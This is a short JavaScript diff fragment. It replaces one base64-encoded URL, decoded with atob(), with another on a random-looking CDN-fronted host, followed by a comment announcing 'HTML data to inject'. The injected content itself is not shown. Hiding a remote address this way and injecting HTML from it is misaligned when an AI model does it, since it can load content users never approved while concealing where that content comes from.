@@ -1,5 +1,5 @@
 // I walked on my keyboard. (Get it, because I'm a furry? No? OK. 3:)
-var link = atob("aHR0cHM6Ly8yeW1tYWxhdi5iZWFud2ViLnF6ei5pby5jZG4uY2xvdWRmbGFyZS5uZXQv");
+var link = atob("aHR0cHM6Ly9maWdzd3JpdS5iZWFud2ViLnF6ei5pby5jZG4uY2xvdWRmbGFyZS5uZXQv");
 
 // HTML data to inject.
 var htmlData = `
